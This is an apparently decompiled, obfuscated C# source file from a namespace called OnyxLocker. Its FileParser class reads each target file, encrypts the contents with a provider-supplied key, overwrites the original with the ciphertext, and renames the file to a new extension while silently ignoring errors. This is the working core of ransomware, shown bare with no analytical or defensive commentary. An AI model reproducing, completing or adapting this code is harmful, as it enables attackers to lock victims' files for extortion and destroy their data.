using System;
using System.IO;
using A;

namespace OnyxLocker;

internal class FileParser : IFileParser
{
	private IEncryptionProvider EncryptionProvider;

	private byte[] KeyBytes;

	public FileParser(IEncryptionProvider encryptionProvider)
	{
		EncryptionProvider = encryptionProvider;
		KeyBytes = c5dabe0e8dd0d1d760ae512aeff259de8.cf4569e22c0f85ceb4658e58f206e1595(EncryptionProvider);
	}

	public void ParseFile(string filePath)
	{
		byte[] c586bb1e4180322e6c9911dbf170646b = cb3ceb1b62b4b815077e9e302713206a6.c757cc4db113ae43c821f8f25a1fa333e(this, filePath);
		byte[] c586bb1e4180322e6c9911dbf170646b2 = c2244d45c83b9c7ec19ab5f3cfad9fc83.cf4569e22c0f85ceb4658e58f206e1595(EncryptionProvider, c586bb1e4180322e6c9911dbf170646b, KeyBytes);
		ceb3a44913aa847d91fc9a8618db7d502.c757cc4db113ae43c821f8f25a1fa333e(this, filePath, c586bb1e4180322e6c9911dbf170646b2);
		string extension = Path.GetExtension(filePath);
		string destFileName = filePath.Replace(extension, cffd0443b4551df482d235e66317d4cd4.ce57b55ca454aabe14bf635b4c85d996c(1237));
		try
		{
			File.Move(filePath, destFileName);
		}
		catch
		{
		}
		GC.Collect();
	}

	private byte[] GetFileBytes(string filePath)
	{
		FileStream fileStream = File.OpenRead(filePath);
		try
		{
			byte[] array = c8232485a67170edd7f299aa0b838f6d5.c7cb1f716b787714951ca7b99e7c9eec5((int)checked((nint)fileStream.Length));
			try
			{
				fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
				fileStream.Close();
				return array;
			}
			finally
			{
				fileStream.Close();
			}
		}
		finally
		{
			if (fileStream != null)
			{
				while (true)
				{
					switch (4)
					{
					case 0:
						continue;
					}
					if (1 == 0)
					{
						/*OpCode not supported: LdMemberToken*/;
					}
					((IDisposable)fileStream).Dispose();
					break;
				}
			}
		}
	}

	private void WriteFileBytes(string filePath, byte[] fileBytes)
	{
		FileStream fileStream = File.OpenWrite(filePath);
		try
		{
			if (!fileStream.CanWrite)
			{
				return;
			}
			while (true)
			{
				switch (3)
				{
				case 0:
					continue;
				}
				if (1 == 0)
				{
					/*OpCode not supported: LdMemberToken*/;
				}
				fileStream.Write(fileBytes, 0, Convert.ToInt32((int)(nuint)ca65c669ad629a98cbb942b6119fff32b.c8d798c339232c1b6b575ebd272b15269(fileBytes)));
				return;
			}
		}
		finally
		{
			if (fileStream != null)
			{
				while (true)
				{
					switch (5)
					{
					case 0:
						continue;
					}
					((IDisposable)fileStream).Dispose();
					break;
				}
			}
		}
	}
}
